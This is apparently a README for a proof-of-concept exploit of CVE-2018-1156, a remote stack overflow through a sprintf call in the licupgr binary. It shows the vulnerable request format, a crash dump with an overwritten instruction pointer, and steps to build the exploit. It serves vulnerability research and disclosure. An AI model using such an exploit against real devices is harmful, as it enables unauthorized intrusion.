# CVE-2018-1156

The licupgr binary has a sprintf call that an authenticated user can use to trigger a remote stack buffer overflow. The sprintf is used on the following string:

```sh
GET /ssl_conn.php?usrname=%s&passwd=%s&softid=%s&level=%d&pay_type=%d&board=%d HTTP/1.0
```

Where the user has control of the username and password strings. Tenable's proof of concept results in the following crash dump:

```sh
2018.05.25-10:57:13.72@0: /nova/bin/licupgr
2018.05.25-10:57:13.72@0: --- signal=11 --------------------------------------------
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: eip=0x41414141 eflags=0x00010202
2018.05.25-10:57:13.72@0: edi=0x41414141 esi=0x41414141 ebp=0x41414141 esp=0x7fb052d0
2018.05.25-10:57:13.72@0: eax=0x7fb0532c ebx=0x41414141 ecx=0x00000899 edx=0x00000001
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: maps:
2018.05.25-10:57:13.72@0: 08048000-0804d000 r-xp 00000000 00:0b 1101       /nova/bin/licupgr
2018.05.25-10:57:13.72@0: 77547000-7757c000 r-xp 00000000 00:0b 997        /lib/libuClibc-0.9.33.2.so
2018.05.25-10:57:13.72@0: 77580000-7759a000 r-xp 00000000 00:0b 993        /lib/libgcc_s.so.1
2018.05.25-10:57:13.72@0: 7759b000-775aa000 r-xp 00000000 00:0b 977        /lib/libuc++.so
2018.05.25-10:57:13.72@0: 775ab000-775ad000 r-xp 00000000 00:0b 992        /lib/libdl-0.9.33.2.so
2018.05.25-10:57:13.72@0: 775af000-776f7000 r-xp 00000000 00:0b 987        /lib/libcrypto.so.1.0.0
2018.05.25-10:57:13.72@0: 77706000-7774a000 r-xp 00000000 00:0b 989        /lib/libssl.so.1.0.0
2018.05.25-10:57:13.72@0: 7774e000-77799000 r-xp 00000000 00:0b 979        /lib/libumsg.so
2018.05.25-10:57:13.72@0: 7779f000-777a6000 r-xp 00000000 00:0b 991        /lib/ld-uClibc-0.9.33.2.so
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: stack: 0x7fb06000 - 0x7fb052d0 
2018.05.25-10:57:13.72@0: 41 41 26 73 6f 66 74 69 64 3d 30 58 59 5a 2d 43 46 5a 52 26 6c 65 76 65 6c 3d 31 26 70 61 79 5f 
2018.05.25-10:57:13.72@0: 74 79 70 65 3d 31 26 62 6f 61 72 64 3d 31 20 48 54 54 50 2f 31 2e 30 0d 0a 41 63 63 65 70 74 3a 
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: code: 0x41414141
```

## Compilation
This code was tested on Ubuntu 18.04. There is a dependency on boost and cmake. Simply install them like so:

```sh
sudo apt install libboost-all-dev cmake
```

To compile simply do the following:

```sh
cd poc/cve_2018_1156
mkdir build
cd build
cmake ..
```
